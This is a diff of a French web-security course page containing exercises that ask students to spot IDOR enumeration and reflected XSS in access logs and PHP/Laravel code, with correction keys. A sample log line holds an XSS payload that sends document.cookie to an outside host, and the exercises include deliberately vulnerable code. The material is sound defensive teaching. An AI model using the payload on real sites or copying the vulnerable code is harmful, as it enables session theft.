@@ -25,7 +25,7 @@
       
       
       <link rel="icon" href="../../../xtra/favTNSI.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -33,7 +33,7 @@
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -6700,20 +6700,20 @@
 <p>La suite de l'exercice vous demandera d'identifier les failles de sécurité et de les corriger.</p>
 <h2 id="mise-en-situation">Mise en situation<a class="headerlink" href="#mise-en-situation" title="Permanent link">⚓︎</a></h2>
 <p>Vous êtes en charge de la correction d'un problème de sécurité. Nous sommes dans la phase d'analyse, vous devez identifier un problème. Dans un premier temps, vous devez analyser les logs d'accès à votre application :</p>
-<div class="language-text highlight"><span class="filename">📋 Texte</span><pre><span></span><code>127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] &quot;GET /apache_pb.gif HTTP/1.0&quot; 200 2326
-127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] &quot;GET /favicon.ico HTTP/1.0&quot; 404 209
-192.168.1.1 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /index.html HTTP/1.0&quot; 200 2761
-192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /search?q=demo HTTP/1.0&quot; 200 512
-192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /facture?id=8987 HTTP/1.0&quot; 200 512
-192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /facture?id=8988 HTTP/1.0&quot; 404 512
-192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /facture?id=8989 HTTP/1.0&quot; 404 512
-192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /facture?id=8990 HTTP/1.0&quot; 404 512
-192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /facture?id=8991 HTTP/1.0&quot; 404 512
-192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /facture?id=8991 HTTP/1.0&quot; 404 512
-192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /facture?id=8991 HTTP/1.0&quot; 404 512
-192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /facture?id=8986 HTTP/1.0&quot; 200 512
-192.168.1.2 - - [10/Oct/2024:13:55:36 -0700] &quot;POST /form.php HTTP/1.0&quot; 200 183
-192.168.1.3 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /secret.html HTTP/1.0&quot; 403 289
+<div class="language-text highlight"><span class="filename">📋 Texte</span><pre><span></span><code>127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326
+127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /favicon.ico HTTP/1.0" 404 209
+192.168.1.1 - - [10/Oct/2024:13:55:36 -0700] "GET /index.html HTTP/1.0" 200 2761
+192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /search?q=demo HTTP/1.0" 200 512
+192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8987 HTTP/1.0" 200 512
+192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8988 HTTP/1.0" 404 512
+192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8989 HTTP/1.0" 404 512
+192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8990 HTTP/1.0" 404 512
+192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8991 HTTP/1.0" 404 512
+192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8991 HTTP/1.0" 404 512
+192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8991 HTTP/1.0" 404 512
+192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8986 HTTP/1.0" 200 512
+192.168.1.2 - - [10/Oct/2024:13:55:36 -0700] "POST /form.php HTTP/1.0" 200 183
+192.168.1.3 - - [10/Oct/2024:13:55:36 -0700] "GET /secret.html HTTP/1.0" 403 289
 </code></pre></div>
 <p>Avez-vous identifié un problème de sécurité ? Si oui, lequel ?</p>
 <p>À partir de l'analyse des logs, vous devez maintenant trouver où se trouve la faille dans le code source de votre application. Pour cela, vous avez à votre disposition les éléments suivants (code source projet Laravel) :</p>
@@ -6745,14 +6745,14 @@ storage/
 tests/
 </code></pre></div>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="c1">// Routeur de l&#39;application</span>
+<span class="c1">// Routeur de l'application</span>
 
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@index&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@index&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/facture&#39;</span><span class="p">,</span> <span class="s1">&#39;FactureController@index&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="s1">&#39;AdminController@index&#39;</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="s1">'HomeController@index'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/search'</span><span class="p">,</span> <span class="s1">'HomeController@index'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/facture'</span><span class="p">,</span> <span class="s1">'FactureController@index'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/admin'</span><span class="p">,</span> <span class="s1">'AdminController@index'</span><span class="p">);</span>
 <span class="c1">// …</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/admin/users&#39;</span><span class="p">,</span> <span class="s1">&#39;UserController@index&#39;</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/admin/users'</span><span class="p">,</span> <span class="s1">'UserController@index'</span><span class="p">);</span>
 </code></pre></div>
 <p>Quels sont les fichiers à analyser pour trouver la faille de sécurité ?</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
@@ -6761,10 +6761,10 @@ tests/
 <span class="p">{</span>
     <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span>
     <span class="p">{</span>
-        <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>
+        <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s1">'id'</span><span class="p">);</span>
         <span class="nv">$facture</span> <span class="o">=</span> <span class="nx">Facture</span><span class="o">::</span><span class="na">find</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$facture</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">return</span> <span class="nx">view</span><span class="p">(</span><span class="s1">&#39;facture&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;facture&#39;</span> <span class="o">=&gt;</span> <span class="nv">$facture</span><span class="p">]);</span>
+            <span class="k">return</span> <span class="nx">view</span><span class="p">(</span><span class="s1">'facture'</span><span class="p">,</span> <span class="p">[</span><span class="s1">'facture'</span> <span class="o">=&gt;</span> <span class="nv">$facture</span><span class="p">]);</span>
         <span class="p">}</span>
         <span class="k">return</span> <span class="nx">abort</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span>
     <span class="p">}</span>
@@ -6775,7 +6775,7 @@ tests/
     <span class="p">}</span>
 
     <span class="k">private</span> <span class="k">function</span> <span class="nf">throttleUserAccess</span><span class="p">(){</span>
-        <span class="k">return</span> <span class="nx">RateLimiter</span><span class="o">::</span><span class="na">for</span><span class="p">(</span><span class="s1">&#39;facture&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">hit</span><span class="p">(</span><span class="nx">Auth</span><span class="o">::</span><span class="na">id</span><span class="p">());</span>
+        <span class="k">return</span> <span class="nx">RateLimiter</span><span class="o">::</span><span class="na">for</span><span class="p">(</span><span class="s1">'facture'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">hit</span><span class="p">(</span><span class="nx">Auth</span><span class="o">::</span><span class="na">id</span><span class="p">());</span>
     <span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
@@ -6797,15 +6797,15 @@ tests/
         <span class="c1">// Limite le nombre de requêtes (anti-énumération)</span>
         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">throttleUserAccess</span><span class="p">();</span>
 
-        <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>
+        <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s1">'id'</span><span class="p">);</span>
         <span class="nv">$facture</span> <span class="o">=</span> <span class="nx">Facture</span><span class="o">::</span><span class="na">find</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
 
-        <span class="c1">// Vérifie que la facture existe ET appartient à l&#39;utilisateur connecté</span>
+        <span class="c1">// Vérifie que la facture existe ET appartient à l'utilisateur connecté</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$facture</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkIfUserCanAccessFacture</span><span class="p">(</span><span class="nv">$facture</span><span class="p">))</span> <span class="p">{</span>
-            <span class="k">return</span> <span class="nx">view</span><span class="p">(</span><span class="s1">&#39;facture&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;facture&#39;</span> <span class="o">=&gt;</span> <span class="nv">$facture</span><span class="p">]);</span>
+            <span class="k">return</span> <span class="nx">view</span><span class="p">(</span><span class="s1">'facture'</span><span class="p">,</span> <span class="p">[</span><span class="s1">'facture'</span> <span class="o">=&gt;</span> <span class="nv">$facture</span><span class="p">]);</span>
         <span class="p">}</span>
 
-        <span class="k">return</span> <span class="nx">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">);</span> <span class="c1">// Forbidden, pas 404 (ne pas révéler l&#39;existence)</span>
+        <span class="k">return</span> <span class="nx">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">);</span> <span class="c1">// Forbidden, pas 404 (ne pas révéler l'existence)</span>
     <span class="p">}</span>
 
     <span class="k">private</span> <span class="k">function</span> <span class="nf">checkIfUserCanAccessFacture</span><span class="p">(</span><span class="nv">$facture</span><span class="p">)</span>
@@ -6815,7 +6815,7 @@ tests/
 
     <span class="k">private</span> <span class="k">function</span> <span class="nf">throttleUserAccess</span><span class="p">()</span>
     <span class="p">{</span>
-        <span class="k">return</span> <span class="nx">RateLimiter</span><span class="o">::</span><span class="na">for</span><span class="p">(</span><span class="s1">&#39;facture&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">hit</span><span class="p">(</span><span class="nx">Auth</span><span class="o">::</span><span class="na">id</span><span class="p">());</span>
+        <span class="k">return</span> <span class="nx">RateLimiter</span><span class="o">::</span><span class="na">for</span><span class="p">(</span><span class="s1">'facture'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">hit</span><span class="p">(</span><span class="nx">Auth</span><span class="o">::</span><span class="na">id</span><span class="p">());</span>
     <span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
@@ -6895,25 +6895,25 @@ Une même IP effectue des centaines de requêtes en incrémentant un paramètre 
 </details>
 <h2 id="faille-0">Faille 0<a class="headerlink" href="#faille-0" title="Permanent link">⚓︎</a></h2>
 <p>Observer les logs d'accès à votre application :</p>
-<div class="language-text highlight"><span class="filename">📋 Texte</span><pre><span></span><code>127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] &quot;GET /apache_pb.gif HTTP/1.0&quot; 200 2326
-127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] &quot;GET /favicon.ico HTTP/1.0&quot; 404 209
-192.168.1.1 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /index.html HTTP/1.0&quot; 200 2761
-192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /search.php?query=&lt;script&gt;document.location=&#39;http://192.168.1.4.com/?c=&#39;+document.cookie&lt;/script&gt; HTTP/1.0&quot; 200 512
-192.168.1.2 - - [10/Oct/2024:13:55:36 -0700] &quot;POST /form.php HTTP/1.0&quot; 200 183
-192.168.1.3 - - [10/Oct/2024:13:55:36 -0700] &quot;GET /secret.html HTTP/1.0&quot; 403 289
+<div class="language-text highlight"><span class="filename">📋 Texte</span><pre><span></span><code>127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326
+127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /favicon.ico HTTP/1.0" 404 209
+192.168.1.1 - - [10/Oct/2024:13:55:36 -0700] "GET /index.html HTTP/1.0" 200 2761
+192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /search.php?query=&lt;script&gt;document.location='http://192.168.1.4.com/?c='+document.cookie&lt;/script&gt; HTTP/1.0" 200 512
+192.168.1.2 - - [10/Oct/2024:13:55:36 -0700] "POST /form.php HTTP/1.0" 200 183
+192.168.1.3 - - [10/Oct/2024:13:55:36 -0700] "GET /secret.html HTTP/1.0" 403 289
 </code></pre></div>
 <p>Les logs vous semblent-ils suspects ? Si oui, pourquoi ?</p>
 <p>Corriger le code de la page <code>search.php</code> pour éviter cette faille.</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="nv">$query</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">];</span>
-<span class="k">echo</span> <span class="s2">&quot;Résultat de la recherche pour </span><span class="si">$query</span><span class="s2">&quot;</span><span class="p">;</span>
-<span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM articles WHERE title LIKE &#39;%?%&#39;&quot;</span><span class="p">);</span>
+<span class="nv">$query</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'query'</span><span class="p">];</span>
+<span class="k">echo</span> <span class="s2">"Résultat de la recherche pour </span><span class="si">$query</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM articles WHERE title LIKE '%?%'"</span><span class="p">);</span>
 <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$query</span><span class="p">]);</span>
 <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
 
 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$article</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">echo</span> <span class="s2">&quot;&lt;h2&gt;</span><span class="si">$article[&#39;title&#39;]</span><span class="s2">&lt;/h2&gt;&quot;</span><span class="p">;</span>
-    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;</span><span class="si">$article[&#39;content&#39;]</span><span class="s2">&lt;/p&gt;&quot;</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;h2&gt;</span><span class="si">$article['title']</span><span class="s2">&lt;/h2&gt;"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;p&gt;</span><span class="si">$article['content']</span><span class="s2">&lt;/p&gt;"</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
 </code></pre></div>
@@ -6921,7 +6921,7 @@ Une même IP effectue des centaines de requêtes en incrémentant un paramètre 
 <summary>Éléments de correction</summary>
 <p><strong>Analyse des logs</strong></p>
 <p>Oui, la ligne suivante est <strong>très suspecte</strong> :
-<div class="language-text highlight"><span class="filename">📋 Texte</span><pre><span></span><code>GET /search.php?query=&lt;script&gt;document.location=&#39;http://192.168.1.4.com/?c=&#39;+document.cookie&lt;/script&gt;
+<div class="language-text highlight"><span class="filename">📋 Texte</span><pre><span></span><code>GET /search.php?query=&lt;script&gt;document.location='http://192.168.1.4.com/?c='+document.cookie&lt;/script&gt;
 </code></pre></div>
 Il s'agit d'une tentative d'injection <strong>XSS réfléchie</strong> (Cross-Site Scripting). L'attaquant injecte un script JavaScript dans le paramètre <code>query</code> qui, si la page l'affiche sans échappement, sera exécuté dans le navigateur de la victime et enverra ses cookies à <code>192.168.1.4</code>. Le serveur a répondu <strong>200</strong> : la requête a été acceptée, ce qui suggère que la faille est exploitable.</p>
 <p><strong>Correction du code</strong></p>
@@ -6931,21 +6931,21 @@ Il s'agit d'une tentative d'injection <strong>XSS réfléchie</strong> (Cross-Si
 <li>Le placeholder <code>?</code> dans <code>LIKE '%?%'</code> est mal utilisé (les <code>%</code> doivent être dans la valeur, pas autour du <code>?</code>) → <strong>requête préparée incorrecte</strong></li>
 </ol>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="c1">// 1. Récupérer et assainir l&#39;entrée utilisateur</span>
-<span class="nv">$query</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">);</span>
+<span class="c1">// 1. Récupérer et assainir l'entrée utilisateur</span>
+<span class="nv">$query</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
 
 <span class="c1">// 2. Afficher la valeur échappée (plus de XSS possible)</span>
-<span class="k">echo</span> <span class="s2">&quot;Résultat de la recherche pour &quot;</span> <span class="o">.</span> <span class="nv">$query</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"Résultat de la recherche pour "</span> <span class="o">.</span> <span class="nv">$query</span><span class="p">;</span>
 
 <span class="c1">// 3. Corriger la requête préparée : les % font partie de la valeur liée</span>
-<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM articles WHERE title LIKE ?&quot;</span><span class="p">);</span>
-<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="s1">&#39;%&#39;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;%&#39;</span><span class="p">]);</span>
+<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM articles WHERE title LIKE ?"</span><span class="p">);</span>
+<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="s1">'%'</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'%'</span><span class="p">]);</span>
 <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
 
 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$article</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// 4. Échapper aussi les données issues de la base avant affichage</span>
-    <span class="k">echo</span> <span class="s2">&quot;&lt;h2&gt;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;/h2&gt;&quot;</span><span class="p">;</span>
-    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;/p&gt;&quot;</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;h2&gt;"</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'title'</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;/h2&gt;"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;p&gt;"</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'content'</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;/p&gt;"</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
 </code></pre></div>
@@ -6958,26 +6958,26 @@ Il s'agit d'une tentative d'injection <strong>XSS réfléchie</strong> (Cross-Si
 <p>L'auditeur a trouvé une faille de type XSS (Cross Site Scripting). Il a réussi à afficher une boîte de dialogue sur le navigateur de l'utilisateur.</p>
 <p>Le code source ou la faille se trouve est le suivant :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
-    <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
-    <span class="k">echo</span> <span class="s2">&quot;&lt;h2&gt;Bonjour </span><span class="si">$name</span><span class="s2">&lt;/h2&gt;&quot;</span><span class="p">;</span>
-    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Votre email est </span><span class="si">$email</span><span class="s2">&lt;/p&gt;&quot;</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+    <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">];</span>
+    <span class="k">echo</span> <span class="s2">"&lt;h2&gt;Bonjour </span><span class="si">$name</span><span class="s2">&lt;/h2&gt;"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;p&gt;Votre email est </span><span class="si">$email</span><span class="s2">&lt;/p&gt;"</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
-<span class="x">&lt;div class=&quot;container&quot;&gt;</span>
+<span class="x">&lt;div class="container"&gt;</span>
 <span class="x">    &lt;h1&gt;Exercice 1&lt;/h1&gt;</span>
 <span class="x">    &lt;p&gt;Vous devez corriger la faille XSS&lt;/p&gt;</span>
-<span class="x">    &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;</span>
-<span class="x">        &lt;div class=&quot;form-group&quot;&gt;</span>
-<span class="x">            &lt;label for=&quot;name&quot;&gt;Nom&lt;/label&gt;</span>
-<span class="x">            &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Nom&quot;&gt;</span>
+<span class="x">    &lt;form action="index.php" method="post"&gt;</span>
+<span class="x">        &lt;div class="form-group"&gt;</span>
+<span class="x">            &lt;label for="name"&gt;Nom&lt;/label&gt;</span>
+<span class="x">            &lt;input type="text" class="form-control" id="name" name="name" placeholder="Nom"&gt;</span>
 <span class="x">        &lt;/div&gt;</span>
-<span class="x">        &lt;div class=&quot;form-group&quot;&gt;</span>
-<span class="x">            &lt;label for=&quot;email&quot;&gt;Email&lt;/label&gt;</span>
-<span class="x">            &lt;input type=&quot;email&quot; class=&quot;form-control&quot; id=&quot;email&quot; name=&quot;email&quot; placeholder=&quot;Email&quot;&gt;</span>
+<span class="x">        &lt;div class="form-group"&gt;</span>
+<span class="x">            &lt;label for="email"&gt;Email&lt;/label&gt;</span>
+<span class="x">            &lt;input type="email" class="form-control" id="email" name="email" placeholder="Email"&gt;</span>
 <span class="x">        &lt;/div&gt;</span>
-<span class="x">        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Envoyer&lt;/button&gt;</span>
+<span class="x">        &lt;button type="submit" class="btn btn-primary"&gt;Envoyer&lt;/button&gt;</span>
 <span class="x">    &lt;/form&gt;</span>
 <span class="x">&lt;/div&gt;</span>
 </code></pre></div>
@@ -6985,13 +6985,13 @@ Il s'agit d'une tentative d'injection <strong>XSS réfléchie</strong> (Cross-Si
 <p class="admonition-title">Rappel</p>
 <p>Filtrer les entrées utilisateur avec la fonction <code>htmlspecialchars()</code>. Cette fonction permet de convertir les caractères spéciaux en entités HTML.</p>
 <p>Exemple :</p>
-<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">// Échappe les caractères spéciaux. C&#39;est à dire que les caractères spéciaux seront convertis en entités HTML.</span>
-<span class="x">$name = htmlspecialchars($_POST[&#39;name&#39;]);</span>
+<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">// Échappe les caractères spéciaux. C'est à dire que les caractères spéciaux seront convertis en entités HTML.</span>
+<span class="x">$name = htmlspecialchars($_POST['name']);</span>
 </code></pre></div>
 <p>Autre solution, utiliser la fonction <code>strip_tags()</code>. Cette fonction permet de supprimer les balises HTML.</p>
 <p>Exemple :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">// Supprime les balises HTML</span>
-<span class="x">$name = strip_tags($_POST[&#39;name&#39;]);</span>
+<span class="x">$name = strip_tags($_POST['name']);</span>
 </code></pre></div>
 </div>
 <p>Proposez une solution pour corriger cette faille.</p>
@@ -6999,24 +6999,24 @@ Il s'agit d'une tentative d'injection <strong>XSS réfléchie</strong> (Cross-Si
 <summary>Éléments de correction</summary>
 <p><strong>Nature de la faille</strong></p>
 <p>Les variables <code>$name</code> et <code>$email</code> sont affichées directement dans la page sans aucun traitement. Un attaquant peut soumettre le formulaire avec la valeur :</p>
-<p><div class="language-text highlight"><span class="filename">📋 Texte</span><pre><span></span><code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+<p><div class="language-text highlight"><span class="filename">📋 Texte</span><pre><span></span><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
 </code></pre></div>
 Ce script sera interprété par le navigateur → <strong>XSS réfléchie</strong>.</p>
 <p><strong>Correction avec <code>htmlspecialchars()</code></strong></p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
